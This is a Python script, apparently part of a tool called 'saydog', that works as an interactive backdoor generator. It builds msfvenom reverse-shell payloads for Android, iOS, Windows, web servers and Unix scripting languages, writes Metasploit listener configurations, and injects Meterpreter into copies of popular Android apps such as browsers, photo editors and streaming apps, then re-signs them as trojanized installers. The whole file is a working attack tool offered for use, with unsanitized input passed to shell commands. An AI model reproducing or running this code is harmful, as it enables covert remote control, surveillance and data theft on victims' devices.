import os
import time
import sys
from sys import *
import subprocess

#################### font colors ####################
w="\033[00m"
r="\033[31m"
g="\033[32m"
y="\033[33m"
b="\033[34m"
p="\033[35m"
c="\033[36m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"
#################### menu ####################
def menu():
        try:
                os.system("postgres -D  $PREFIX/var/lib/postgresql &> /dev//null &")
                print ("")
                print (w+"{"+B+W+" BACKDOOR "+w+"}")
                print ("")
                print ("{1}--- Android payload generator")
                print ("{2}--- Apple ios payload generator")
                print ("{3}--- Windows payload generator")
                print ("{4}--- Web payload generator")
                print ("{5}--- Scripting payload generator")
                print ("")
                print ("{0}--- Back to main menu")
                print ("")
                dog = str(input("choose@number:~$ "))
                if dog == "0" or dog == "back":
                        sys.exit(1)
                elif dog == "1" or dog == "01":
                        print ("")
                        print ("{1}--- payload android/meterpreter/reverse_tcp")
                        print ("{2}--- payload android/meterpreter/reverse_http")
                        print ("{3}--- payload android/meterpreter/reverse_https")
                        print ("")
                        print ("{0}--- Back to backdoor menu")
                        print ("")
                        dog = str(input("choose@number:~$ "))
                        if dog == "0" or dog == "back":
                                menu()
                        elif dog == "1" or dog == "01":
                                rname = "tcp"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "2" or dog == "02":
                                rname = "http"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "3" or dog == "03":
                                rname = "https"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        else:
                                sys.exit(1)
                        port = str(input(w+"set LPORT: "))
                        print ("")
                        print (b+"[+]"+w+" configurating metasploit payloads")
                        payload = "msfvenom -p android/meterpreter/reverse_"+str(rname)+" lhost="+str(ip)+" lport="+str(port)+" --platform android --arch dalvik -o tmp/payload.apk"
                        print (b+"[+]"+w+" generating backdoor using msfvenom")
                        os.system(payload+" &> /dev//null")
                        os.system("echo 'use multi/handler' > saydog.rc")
                        os.system("echo 'set payload android/meterpreter/reverse_"+rname+"' >> saydog.rc")
                        os.system("echo 'set LHOST "+ip+"' >> saydog.rc")
                        os.system("echo 'set LPORT "+port+"' >> saydog.rc")
                        os.system("echo 'show options' >> saydog.rc")
                        print (g+"[+]"+w+" payload successfully generated")
                        print ("")
                        ask = str(input("Do you want to bind payload.apk into original.apk? (y/n) "))
                        if ask == "y" or ask == "Y" or ask == "yes" or ask == "Yes" or ask == "YES":
                                print ("")
                                print (w+"{"+B+W+"      APP NAME                  DESCRIPTION           "+w+"}")
                                print ("")
                                print ("    1) UC_Mini.apk             Browser")
                                print ("    2) Speed_test.apk          Internet speed test")
                                print ("    3) Hackers_keylogger.apk   Android keylogger app")
                                print ("    4) Vidmate.apk             Apps store")
                                print ("    5) Droid_sqli.apk          Android sql-injection")
                                print ("    6) Wps_connect.apk         Wifi password cracker")
                                print ("    7) Indoxxi.apk             Streaming movies")
                                print ("    8) Layarkaca21.apk         Streaming movies")
                                print ("    9) Hackers_keyboard.apk    Keyboard for android")
                                print ("   10) Infinite_design.apk     Design apps")
                                print ("   11) TezzaPro.apk            Photo editor")
                                print ("   12) PicsayPro.apk           Photo editor")
                                print ("   13) Avee_player.apk         Music player")
                                print ("")
                                dog = str(input("choose@number:~$ "))
                                if dog == "1" or dog ==  "01":
                                        tmp = "UC_Mini"
                                        src = "com/"
                                        pass
                                elif dog == "2" or dog == "02":
                                        tmp = "Speed_test"
                                        src = "pl/"
                                        pass
                                elif dog == "3" or dog == "03":
                                        tmp = "Hackers_keylogger"
                                        src = "hack/"
                                        pass
                                elif dog == "4" or dog == "04":
                                        tmp = "Vidmate"
                                        src = "com/"
                                        pass
                                elif dog == "5" or dog == "05":
                                        tmp = "Droid_sqli"
                                        src = "net/"
                                        pass
                                elif dog == "6" or dog == "06":
                                        tmp = "Wps_connect"
                                        src = "com/"
                                        pass
                                elif dog == "7" or dog == "07":
                                        tmp = "Indoxxi"
                                        src = "com/"
                                        pass
                                elif dog == "8" or dog == "08":
                                        tmp = "Layarkaca21"
                                        src = "com/"
                                        pass
                                elif dog == "9" or dog == "09":
                                        tmp = "Hackers_keyboard"
                                        src = "org/"
                                        pass
                                elif dog == "10":
                                        tmp = "Infinite_design"
                                        src = "com/"
                                        pass
                                elif dog == "11":
                                        tmp = "TezzaPro"
                                        src = "org/"
                                        pass
                                elif dog == "12":
                                        tmp = "PicsayPro"
                                        src = "com/"
                                        pass
                                elif dog == "13":
                                        tmp = "Avee_player"
                                        src = "com/"
                                        pass
                                else:
                                        print (w)
                                        print (r+"[!]"+w+" invalid options")
                                        print (r+"[!]"+w+" file saved as: modules/tmp/payload.apk")
                                        print (w)
                                        dog = str(input("[ enter ]"))
                                        if dog == "":
                                                sys.exit(0)
                                        else:
                                                sys.exit(0)
                                print ("")
                                os.system("bash check.sh")
                                print (b+"[+]"+w+" using template: "+g+tmp+".apk")
                                print (b+"[+]"+w+" decompile payload apk using apktool")
                                os.system("proot apktool d -f tmp/payload.apk &> /dev//null")
                                print (b+"[+]"+w+" inject the original apk with metasploit payloads")
                                os.system("sleep 3;cp -r backdoor/"+tmp+" tmp/;cp -r payload/smali/com/metasploit tmp/"+tmp+"/"+src)
                                print (g+"[+]"+w+" successfully injection original apk file")
                                print (b+"[+]"+w+" building original apk using apktool")
                                os.system("proot apktool241 b tmp/"+tmp+" -o tmp/original.apk &> /dev//null")
                                print (b+"[+]"+w+" auto generate keystore using apksigner")
                                print (b+"[+]"+w+" signing original apk using apksigner")
                                os.system("apksigner -p android keystore tmp/original.apk tmp/"+tmp+"-injected.apk &> /dev//null")
                                print (g+"[+]"+w+" successfully signing original apk file")
                                print (g+"[+]"+w+" android backdoor has been generated")
                                print ("")
                                out = str(input("save file to [example: /sdcard]: "))
                                if out == "" or out == " ":
                                        out = "/sdcard"
                                        pass
                                else:
                                        out = out
                                        pass
                                print ("")
                                os.system("cp tmp/"+tmp+"-injected.apk /"+out)
                                os.system("rm -rf payload tmp/*;rm -rf payload.apk '?'")
                                print (g+"[+]"+w+" file saved as: "+out+"/"+tmp+"-injected.apk")
                                print ("")
                                dog = str(input("Do you want to start listener? (y/n) "))
                                if dog == "y" or dog == "Y" or dog == "yes" or dog == "Yes" or dog == "YES":
                                        print ("")
                                        os.system("msfconsole -q -r saydog.rc")
                                        pass
                                else:
                                        pass
                                print ("")
                                dog = str(input("[ enter ]"))
                                if dog == "":
                                        sys.exit(0)
                                else:
                                        sys.exit(0)
                        else:
                                print ("")
                                name = str(input("set filename [example: payload]: "))
                                if name == "" or name == " ":
                                        name = "payload"
                                        pass
                                else:
                                        pass
                                outp = str(input("save file to [example: /sdcard]: "))
                                if outp == "" or outp == " ":
                                        outp = "/sdcard"
                                        pass
                                else:
                                        pass
                                print ("")
                                os.system("cp -r tmp/payload.apk /"+outp+"/"+name+".apk")
                                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                                print ("")
                                dog = str(input("[ enter ]"))
                                if dog == "":
                                        sys.exit(0)
                                else:
                                        sys.exit(0)
                elif dog == "2" or dog == "02":
                        print ("")
                        print ("{1}--- payload apple_ios/meterpreter/reverse_tcp")
                        print ("{2}--- payload apple_ios/meterpreter/reverse_http")
                        print ("{3}--- payload apple_ios/meterpreter/reverse_https")
                        print ("")
                        print ("{0}--- Back to backdoor menu")
                        print ("")
                        dog = str(input("choose@number:~$ "))
                        if dog == "0" or dog == "back":
                                menu()
                        elif dog == "1" or dog == "01":
                                rname = "tcp"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "2" or dog == "02":
                                rname = "http"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "3" or dog == "03":
                                rname = "https"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        else:
                                sys.exit(1)
                        port = str(input(w+"set LPORT [ex: 4444]: "))
                        if port == "" or port == " ":
                                port = "4444"
                                pass
                        else:
                                pass
                        arch = str(input(w+"set AARCH [ex: aarch64, armle]: "))
                        if arch == "" or arch == " ":
                                arch = "aarch64"
                                pass
                        else:
                                pass
                        print ("")
                        print (b+"[+]"+w+" configurating metasploit payloads")
                        payload = "msfvenom -p apple_ios/"+str(arch)+"/meterpreter_reverse_"+str(rname)+" lhost="+str(ip)+" lport="+str(port)+" --platform apple_ios --arch "+str(arch)+" -f macho -o payload.macho"
                        print (b+"[+]"+w+" generating backdoor using msfvenom")
                        os.system(payload+" &> /dev//null")
                        os.system("echo 'use multi/handler' > saydog.rc")
                        os.system("echo 'set payload apple_ios/"+arch+"/meterpreter_reverse_"+rname+"' >> saydog.rc")
                        os.system("echo 'set LHOST "+ip+"' >> saydog.rc")
                        os.system("echo 'set LPORT "+port+"' >> saydog.rc")
                        os.system("echo 'show options' >> saydog.rc")
                        print (g+"[+]"+w+" payload successfully generated")
                        print ("")
                        name = str(input("set filename [example: payload]: "))
                        if name == "" or name == " ":
                                name = "payload"
                                pass
                        else:
                                pass
                        outp = str(input("save file to [example: /sdcard]: "))
                        if outp == "" or outp == " ":
                                outp = "/sdcard"
                                pass
                        else:
                                pass
                        print ("")
                        os.system("cp -r payload.macho /"+outp+"/"+name+".macho;rm payload.macho")
                        print (g+"[+]"+w+" file saved as "+outp+"/"+name+".macho")
                        print ("")
                        dog = str(input("Do you want to start listener? (y/n) "))
                        if dog == "y" or dog == "Y" or dog == "yes" or dog == "Yes" or dog == "YES":
                                print ("")
                                os.system("msfconsole -q -r saydog.rc")
                                pass
                        else:
                                pass
                        print ("")
                        dog = str(input("[ enter ]"))
                        if dog == "":
                                sys.exit(0)
                        else:
                                sys.exit(0)
                elif dog == "3" or dog == "03":
                        print ("")
                        print ("{1}--- payload windows/meterpreter/reverse_tcp")
                        print ("{2}--- payload windows/meterpreter/reverse_http")
                        print ("{3}--- payload windows/meterpreter/reverse_https")
                        print ("")
                        print ("{0}--- Back to backdoor menu")
                        print ("")
                        dog = str(input("choose@number:~$ "))
                        if dog == "0" or dog == "back":
                                menu()
                        elif dog == "1" or dog == "01":
                                rname = "tcp"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "2" or dog == "02":
                                rname = "http"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "3" or dog == "03":
                                rname = "https"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        else:
                                sys.exit(1)
                        port = str(input(w+"set LPORT [ex: 4444]: "))
                        if port == "" or port == " ":
                                port = "4444"
                                pass
                        else:
                                pass
                        arch = str(input(w+"set AARCH [ex: x86, x64]: "))
                        if arch == "" or arch == " ":
                                arch = "x86"
                                pass
                        else:
                                pass
                        print ("")
                        print (b+"[+]"+w+" configurating metasploit payloads")
                        payload = "msfvenom -p windows/meterpreter/reverse_"+str(rname)+" lhost="+str(ip)+" lport="+str(port)+" --platform windows --arch "+str(arch)+" -f exe -o payload.exe"
                        print (b+"[+]"+w+" generating backdoor using msfvenom")
                        os.system(payload+" &> /dev//null")
                        os.system("echo 'use multi/handler' > saydog.rc")
                        os.system("echo 'set payload windows/meterpreter/reverse_"+rname+"' >> saydog.rc")
                        os.system("echo 'set LHOST "+ip+"' >> saydog.rc")
                        os.system("echo 'set LPORT "+port+"' >> saydog.rc")
                        os.system("echo 'show options' >> saydog.rc")
                        print (g+"[+]"+w+" payload successfully generated")
                        print ("")
                        name = str(input("set filename [example: payload]: "))
                        if name == "" or name == " ":
                                name = "payload"
                                pass
                        else:
                                pass
                        outp = str(input("save file to [example: /sdcard]: "))
                        if outp == "" or outp == " ":
                                outp = "/sdcard"
                                pass
                        else:
                                pass
                        print ("")
                        os.system("cp -r payload.exe /"+outp+"/"+name+".exe;rm payload.exe")
                        print (g+"[+]"+w+" file saved as "+outp+"/"+name+".exe")
                        print ("")
                        dog = str(input("Do you want to start listener? (y/n) "))
                        if dog == "y" or dog == "Y" or dog == "yes" or dog == "Yes" or dog == "YES":
                                print ("")
                                os.system("msfconsole -q -r saydog.rc")
                                pass
                        else:
                                pass
                        print ("")
                        dog = str(input("[ enter ]"))
                        if dog == "":
                                sys.exit(0)
                        else:
                                sys.exit(0)
                elif dog == "4" or dog == "04":
                        print ("")
                        print ("{1}--- payload php php/meterpreter_reverse_tcp")
                        print ("{2}--- payload jsp java/jsp_shell_reverse_tcp")
                        print ("{3}--- payload asp windows/meterpreter/reverse_tcp")
                        print ("{4}--- payload war java/jsp_shell_reverse_tcp")
                        print ("")
                        print ("{0}--- Back to backdoor menu")
                        print ("")
                        dog = str(input("choose@number:~$ "))
                        if dog == "0" or dog == "back":
                                menu()
                        elif dog == "1" or dog == "01":
                                web = "php/meterpreter_reverse_tcp"
                                fmt = "raw"
                                ext = "php"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "2" or dog == "02":
                                web = "java/jsp_shell_reverse_tcp"
                                fmt = "jsp"
                                ext = "jsp"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "3" or dog == "03":
                                web = "windows/meterpreter/reverse_tcp"
                                fmt = "raw"
                                ext = "asp"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "4" or dog == "04":
                                web = "java/jsp_shell_reverse_tcp"
                                fmt = "war"
                                ext = "war"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        else:
                                sys.exit(1)
                        port = str(input(w+"set LPORT [ex: 4444]: "))
                        if port == "" or port == " ":
                                port = "4444"
                                pass
                        else:
                                pass
                        print ("")
                        print (b+"[+]"+w+" configurating metasploit payloads")
                        payload = "msfvenom -p "+str(web)+" lhost="+str(ip)+" lport="+str(port)+" -f "+str(fmt)+" > payload."+str(ext)
                        print (b+"[+]"+w+" generating backdoor using msfvenom")
                        os.system(payload+" &> /dev//null")
                        os.system("echo 'use multi/handler' > saydog.rc")
                        os.system("echo 'set payload "+web+"' >> saydog.rc")
                        os.system("echo 'set LHOST "+ip+"' >> saydog.rc")
                        os.system("echo 'set LPORT "+port+"' >> saydog.rc")
                        os.system("echo 'show options' >> saydog.rc")
                        print (g+"[+]"+w+" payload successfully generated")
                        print ("")
                        name = str(input("set filename [example: payload]: "))
                        if name == "" or name == " ":
                                name = "payload"
                                pass
                        else:
                                pass
                        outp = str(input("save file to [example: /sdcard]: "))
                        if outp == "" or outp == " ":
                                outp = "/sdcard"
                                pass
                        else:
                                pass
                        print ("")
                        os.system("cp -r payload."+ext+" /"+outp+"/"+name+"."+ext+";rm payload."+ext)
                        print (g+"[+]"+w+" file saved as "+outp+"/"+name+"."+ext)
                        print ("")
                        dog = str(input("Do you want to start listener? (y/n) "))
                        if dog == "y" or dog == "Y" or dog == "yes" or dog == "Yes" or dog == "YES":
                                print ("")
                                os.system("msfconsole -q -r saydog.rc")
                                pass
                        else:
                                pass
                        print ("")
                        dog = str(input("[ enter ]"))
                        if dog == "":
                                sys.exit(0)
                        else:
                                sys.exit(0)
                elif dog == "5" or dog == "05":
                        print ("")
                        print ("{1}--- payload bash cmd/unix/reverse_bash")
                        print ("{2}--- payload perl cmd/unix/reverse_perl")
                        print ("{3}--- payload python cmd/unix/reverse_python")
                        print ("{4}--- payload ruby cmd/unix/reverse_ruby")
                        print ("")
                        print ("{0}--- Back to backdoor menu")
                        print ("")
                        dog = str(input("choose@number:~$ "))
                        if dog == "0" or dog == "back":
                                menu()
                        elif dog == "1" or dog == "01":
                                fmt = "bash"
                                ext = "sh"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "2" or dog == "02":
                                fmt = "perl"
                                ext = "pl"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "3" or dog == "03":
                                fmt = "python"
                                ext = "py"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        elif dog == "4" or dog == "04":
                                fmt = "ruby"
                                ext = "rb"
                                print ("")
                                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                                        f = open("backdoor/ip.txt","r")
                                        ip = f.readline().strip()
                                        print (w+"set LHOST: "+ip)
                                        pass
                                else:
                                        ip = str(input(w+"set LHOST: "))
                                        pass
                        else:
                                sys.exit(1)
                        port = str(input(w+"set LPORT: "))
                        print ("")
                        print (b+"[+]"+w+" configurating metasploit payloads")
                        payload = "msfvenom -p cmd/unix/reverse_"+str(fmt)+" lhost="+str(ip)+" lport="+str(port)+" -f raw -o payload."+ext
                        print (b+"[+]"+w+" generating backdoor using msfvenom")
                        os.system(payload+" &> /dev//null")
                        os.system("echo 'use multi/handler' > saydog.rc")
                        os.system("echo 'set payload cmd/unix/reverse_"+fmt+"' >> saydog.rc")
                        os.system("echo 'set LHOST "+ip+"' >> saydog.rc")
                        os.system("echo 'set LPORT "+port+"' >> saydog.rc")
                        os.system("echo 'show options' >> saydog.rc")
                        print (g+"[+]"+w+" payload successfully generated")
                        print ("")
                        print ("")
                        name = str(input("set filename [example: payload]: "))
                        if name == "" or name == " ":
                                name = "payload"
                                pass
                        else:
                                pass
                        outp = str(input("save file to [example: /sdcard]: "))
                        if outp == "" or outp == " ":
                                outp = "/sdcard"
                                pass
                        else:
                                pass
                        print ("")
                        os.system("cp -r payload."+ext+" /"+outp+"/"+name+"."+ext+";rm payload."+ext)
                        print (g+"[+]"+w+" file saved as "+outp+"/"+name+"."+ext)
                        print ("")
                        dog = str(input("Do you want to start listener? (y/n) "))
                        if dog == "y" or dog == "Y" or dog == "yes" or dog == "Yes" or dog == "YES":
                                print ("")
                                os.system("msfconsole -q -r saydog.rc")
                                pass
                        else:
                                pass
                        print ("")
                        dog = str(input("[ enter ]"))
                        if dog == "":
                                sys.exit(0)
                        else:
                                sys.exit(0)                        
        except KeyboardInterrupt:
                sys.exit(1)

if "__main__" == __name__:
    if "--backdoor-generator" in sys.argv:
        menu()
    else:
            os.system("saydog")